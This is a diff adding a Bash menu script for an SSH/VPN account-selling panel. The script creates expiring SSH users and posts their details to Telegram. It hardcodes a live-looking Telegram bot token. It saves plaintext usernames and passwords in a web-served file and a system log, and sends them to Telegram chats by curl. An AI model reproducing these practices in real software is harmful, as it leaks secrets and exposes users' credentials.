@@ -1,0 +1,211 @@
+#!/bin/bash
+###########- BOT TELE ################
+AKUN="AKUN SSH"
+TIMES="10"
+CHATID="5627481033"
+CHATIDGC="-1001971246553"
+KEY="5684804886:AAFup0F9eqNPL7yIUUmTPE5is2SaAIYZixQ"
+URL="https://api.telegram.org/bot$KEY/sendMessage"
+##################### END BOT TELE ###############
+clear
+domen=`cat /etc/xray/domain`
+portsshws=`cat ~/log-install.txt | grep -w "SSH Websocket" | cut -d: -f2 | awk '{print $1}'`
+wsssl=`cat /root/log-install.txt | grep -w "SSH SSL Websocket" | cut -d: -f2 | awk '{print $1}'`
+
+echo -e "$COLOR1┌─────────────────────────────────────────────────┐${NC}"
+echo -e "$COLOR1 ${NC} ${COLBG1}               • SSH PANEL MENU •              ${NC} $COLOR1 $NC"
+echo -e "$COLOR1└─────────────────────────────────────────────────┘${NC}"
+echo -e "$COLOR1┌─────────────────────────────────────────────────┐${NC}"
+read -p "   Username : " Login
+read -p "   Owner : " OWNER
+CEKFILE=/etc/xray/ssh.txt
+if [ -f "$CEKFILE" ]; then
+file001="OK"
+else
+touch /etc/xray/ssh.txt
+fi
+
+if grep -qw "$Login" /etc/xray/ssh.txt; then
+echo -e "$COLOR1 ${NC}  [Error] Username \e[31m$Login\e[0m already exist"
+echo -e "$COLOR1└─────────────────────────────────────────────────┘${NC}" 
+echo -e "$COLOR1┌────────────────────── BY ───────────────────────┐${NC}"
+echo -e "$COLOR1 ${NC}                • HayoSia Store •                 $COLOR1 $NC"
+echo -e "$COLOR1└─────────────────────────────────────────────────┘${NC}"
+echo ""
+read -n 1 -s -r -p "  Press any key to back on menu"
+menu-ssh
+else
+echo "$Login" >> /etc/xray/ssh.txt
+fi
+
+if [ -z $Login ]; then
+echo -e "$COLOR1 ${NC} [Error] Username cannot be empty "
+echo -e "$COLOR1└─────────────────────────────────────────────────┘${NC}" 
+echo -e "$COLOR1┌────────────────────── BY ───────────────────────┐${NC}"
+echo -e "$COLOR1 ${NC}                • HayoSia Store •                 $COLOR1 $NC"
+echo -e "$COLOR1└─────────────────────────────────────────────────┘${NC}"
+echo ""
+read -n 1 -s -r -p "    Press any key to back on menu"
+menu-ssh
+fi
+
+read -p "   Password : " Pass
+if [ -z $Pass ]; then
+echo -e "$COLOR1 ${NC}  [Error] Password cannot be empty "
+echo -e "$COLOR1└─────────────────────────────────────────────────┘${NC}" 
+echo -e "$COLOR1┌────────────────────── BY ───────────────────────┐${NC}"
+echo -e "$COLOR1 ${NC}                • HayoSia Store •                 $COLOR1 $NC"
+echo -e "$COLOR1└─────────────────────────────────────────────────┘${NC}"
+echo ""
+read -n 1 -s -r -p "   Press any key to back on menu"
+menu-ssh
+fi
+read -p "   Expired (hari): " masaaktif
+if [ -z $masaaktif ]; then
+echo -e "$COLOR1 ${NC}  [Error] EXP Date cannot be empty "
+echo -e "$COLOR1└─────────────────────────────────────────────────┘${NC}" 
+echo -e "$COLOR1┌────────────────────── BY ───────────────────────┐${NC}"
+echo -e "$COLOR1 ${NC}                • HayoSia Store •                 $COLOR1 $NC"
+echo -e "$COLOR1└─────────────────────────────────────────────────┘${NC}"
+echo ""
+read -n 1 -s -r -p "  Press any key to back on menu"
+menu-ssh
+fi
+
+IP=$(curl -sS ifconfig.me);
+ossl=`cat /root/log-install.txt | grep -w "OpenVPN" | cut -f2 -d: | awk '{print $6}'`
+opensh=`cat /root/log-install.txt | grep -w "OpenSSH" | cut -f2 -d: | awk '{print $1}'`
+db=`cat /root/log-install.txt | grep -w "Dropbear" | cut -f2 -d: | awk '{print $1,$2}'`
+ssl="$(cat ~/log-install.txt | grep -w "Stunnel4" | cut -d: -f2)"
+sqd="$(cat ~/log-install.txt | grep -w "Squid" | cut -d: -f2)"
+ovpn="$(netstat -nlpt | grep -i openvpn | grep -i 0.0.0.0 | awk '{print $4}' | cut -d: -f2)"
+ovpn2="$(netstat -nlpu | grep -i openvpn | grep -i 0.0.0.0 | awk '{print $4}' | cut -d: -f2)"
+
+OhpSSH=`cat /root/log-install.txt | grep -w "OHP SSH" | cut -d: -f2 | awk '{print $1}'`
+OhpDB=`cat /root/log-install.txt | grep -w "OHP DBear" | cut -d: -f2 | awk '{print $1}'`
+OhpOVPN=`cat /root/log-install.txt | grep -w "OHP OpenVPN" | cut -d: -f2 | awk '{print $1}'`
+
+sleep 1
+clear
+useradd -e `date -d "$masaaktif days" +"%Y-%m-%d"` -s /bin/false -M $Login
+exp="$(chage -l $Login | grep "Account expires" | awk -F": " '{print $2}')"
+echo -e "$Pass\n$Pass\n"|passwd $Login &> /dev/null
+PID=`ps -ef |grep -v grep | grep sshws |awk '{print $2}'`
+
+cat > /home/vps/public_html/ssh-$Login.txt <<-END
+=======================
+INFO        SSH Account
+=======================
+Username   : $Login
+Password   : $Pass
+Expired On : $exp
+=======================
+IP         : $IP
+Host       : $domen
+OpenSSH    : $opensh
+Dropbear   : $db
+SSH-WS     : $portsshws
+SSH-SSL-WS : $wsssl
+SSL/TLS    :$ssl
+UDPGW      : 7100-7300
+=======================
+GET wss://BUG/ HTTP/1.1[crlf]Host: $domen [crlf]Upgrade: websocket[crlf][crlf]
+=======================
+END
+TRX="
+<code>INFO MASKU -Transaksi</code>
+<code>────────────────────</code>
+<b>  ⚠️TRANSAKSI SSH OVPN⚠️      </b>
+<code>────────────────────</code>
+<code>🌟Owner   : $OWNER</code>
+<code>🌟Detail  : $AKUN</code>
+<code>🌟Expired : $exp</code>
+<code>🌟Server  : $domen</code>
+<code>────────────────────</code>
+<i>Notifikasi Via DeadrzBOT</i>
+<b>Tele : @ProjectDedi_bot</b>
+"
+TEXT="
+<code>────────────────────</code>
+<b>INFO        SSH Account</b>
+<code>────────────────────</code>
+<code>Username   : $Login</code>
+<code>Password   : $Pass</code>
+<code>────────────────────</code>
+<code>IP         : $IP</code>
+<code>Host       : $domen</code>
+<code>OpenSSH    : $opensh</code>
+<code>Dropbear   : $db</code>
+<code>SSH-WS     : $portsshws</code>
+<code>SSH-SSL-WS : $wsssl</code>
+<code>SSL/TLS    :$ssl</code>
+<code>UDPGW      : 7100-7300</code>
+<code>────────────────────</code>
+<code>PADYLOAD : </code><code>GET wss://BUG/ HTTP/1.1[crlf]Host: $domen [crlf]Upgrade: websocket[crlf][crlf]</code>
+<code>────────────────────</code>
+<code>🔮 Details INFO :</code>
+http://${domen}:81/ssh-$Login.txt
+<code>️📅 Expired On : $exp</code>
+<code>──────────────────────────</code>
+<i>Notifikasi Via DeadrzBOT</i>
+<b>Tele : @ProjectDedi_bot</b>
+"
+curl -s --max-time $TIMES -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL
+clear
+curl -s --max-time $TIMES -d "chat_id=$CHATIDGC&disable_web_page_preview=1&text=$TRX&parse_mode=html" $URL
+clear
+
+if [[ ! -z "${PID}" ]]; then
+echo -e "$COLOR1┌─────────────────────────────────────────────────┐${NC}" | tee -a /etc/log-create-user.log
+echo -e "$COLOR1 ${NC} ${COLBG1}               • SSH PANEL MENU •              ${NC} $COLOR1 $NC" | tee -a /etc/log-create-user.log
+echo -e "$COLOR1└─────────────────────────────────────────────────┘${NC}" | tee -a /etc/log-create-user.log
+echo -e "$COLOR1┌─────────────────────────────────────────────────┐${NC}" | tee -a /etc/log-create-user.log
+echo -e "$COLOR1 $NC  Username   : $Login"  | tee -a /etc/log-create-user.log
+echo -e "$COLOR1 $NC  Password   : $Pass" | tee -a /etc/log-create-user.log
+echo -e "$COLOR1 $NC  Expired On : $exp"  | tee -a /etc/log-create-user.log
+echo -e "$COLOR1└─────────────────────────────────────────────────┘${NC}" | tee -a /etc/log-create-user.log
+echo -e "$COLOR1┌─────────────────────────────────────────────────┐${NC}" | tee -a /etc/log-create-user.log
+echo -e "$COLOR1 $NC  IP         : $IP"  | tee -a /etc/log-create-user.log
+echo -e "$COLOR1 $NC  Host       : $domen"  | tee -a /etc/log-create-user.log
+echo -e "$COLOR1 $NC  OpenSSH    : $opensh" | tee -a /etc/log-create-user.log
+echo -e "$COLOR1 $NC  Dropbear   : $db"  | tee -a /etc/log-create-user.log
+echo -e "$COLOR1 $NC  SSH-WS     : $portsshws"  | tee -a /etc/log-create-user.log
+echo -e "$COLOR1 $NC  SSH-SSL-WS : $wsssl"  | tee -a /etc/log-create-user.log
+echo -e "$COLOR1 $NC  SSL/TLS    :$ssl"  | tee -a /etc/log-create-user.log
+echo -e "$COLOR1 $NC  UDPGW      : 7100-7300"  | tee -a /etc/log-create-user.log
+echo -e "$COLOR1└─────────────────────────────────────────────────┘${NC}" | tee -a /etc/log-create-user.log
+echo -e "$COLOR1┌─────────────────────────────────────────────────┐${NC}" | tee -a /etc/log-create-user.log
+echo -e "  GET wss://BUG/ HTTP/1.1[crlf]Host: $domen [crlf]Upgrade: websocket[crlf][crlf]" | tee -a /etc/log-create-user.log
+echo -e "$COLOR1└─────────────────────────────────────────────────┘${NC}"  | tee -a /etc/log-create-user.log
+echo -e "$COLOR1┌────────────────────── BY ───────────────────────┐${NC}" | tee -a /etc/log-create-user.log
+echo -e "$COLOR1 ${NC}                • HayoSia Store •                 $COLOR1 $NC" | tee -a /etc/log-create-user.log
+echo -e "$COLOR1└─────────────────────────────────────────────────┘${NC}" | tee -a /etc/log-create-user.log
+else
+echo -e "$COLOR1┌─────────────────────────────────────────────────┐${NC}" | tee -a /etc/log-create-user.log
+echo -e "$COLOR1 ${NC} ${COLBG1}               • SSH PANEL MENU •              ${NC} $COLOR1 $NC" | tee -a /etc/log-create-user.log
+echo -e "$COLOR1└─────────────────────────────────────────────────┘${NC}" | tee -a /etc/log-create-user.log
+echo -e "$COLOR1┌─────────────────────────────────────────────────┐${NC}" | tee -a /etc/log-create-user.log
+echo -e "$COLOR1 $NC  Username   : $Login"  | tee -a /etc/log-create-user.log
+echo -e "$COLOR1 $NC  Password   : $Pass" | tee -a /etc/log-create-user.log
+echo -e "$COLOR1 $NC  Expired On : $exp"  | tee -a /etc/log-create-user.log
+echo -e "$COLOR1└─────────────────────────────────────────────────┘${NC}" | tee -a /etc/log-create-user.log
+echo -e "$COLOR1┌─────────────────────────────────────────────────┐${NC}" | tee -a /etc/log-create-user.log
+echo -e "$COLOR1 $NC  IP         : $IP"  | tee -a /etc/log-create-user.log
+echo -e "$COLOR1 $NC  Host       : $domen"  | tee -a /etc/log-create-user.log
+echo -e "$COLOR1 $NC  OpenSSH    : $opensh" | tee -a /etc/log-create-user.log
+echo -e "$COLOR1 $NC  Dropbear   : $db"  | tee -a /etc/log-create-user.log
+echo -e "$COLOR1 $NC  SSH-WS     : $portsshws"  | tee -a /etc/log-create-user.log
+echo -e "$COLOR1 $NC  SSH-SSL-WS : $wsssl"  | tee -a /etc/log-create-user.log
+echo -e "$COLOR1 $NC  SSL/TLS    :$ssl"  | tee -a /etc/log-create-user.log
+echo -e "$COLOR1 $NC  UDPGW      : 7100-7300"  | tee -a /etc/log-create-user.log
+echo -e "$COLOR1└─────────────────────────────────────────────────┘${NC}" | tee -a /etc/log-create-user.log
+echo -e "$COLOR1┌─────────────────────────────────────────────────┐${NC}" | tee -a /etc/log-create-user.log
+echo -e "  GET wss://BUG/ HTTP/1.1[crlf]Host: $domen [crlf]Upgrade: websocket[crlf][crlf]" | tee -a /etc/log-create-user.log
+echo -e "$COLOR1└─────────────────────────────────────────────────┘${NC}"  | tee -a /etc/log-create-user.log
+echo -e "$COLOR1┌────────────────────── BY ───────────────────────┐${NC}" | tee -a /etc/log-create-user.log
+echo -e "$COLOR1 ${NC}                • HayoSia Store •                 $COLOR1 $NC" | tee -a /etc/log-create-user.log
+echo -e "$COLOR1└─────────────────────────────────────────────────┘${NC}" | tee -a /etc/log-create-user.log
+fi
+echo -e ""
+read -n 1 -s -r -p "  Press any key to back on menu"
+menu-ssh
